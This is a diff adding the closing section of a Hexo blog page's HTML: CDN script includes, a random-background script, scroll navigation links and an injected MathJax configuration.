+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
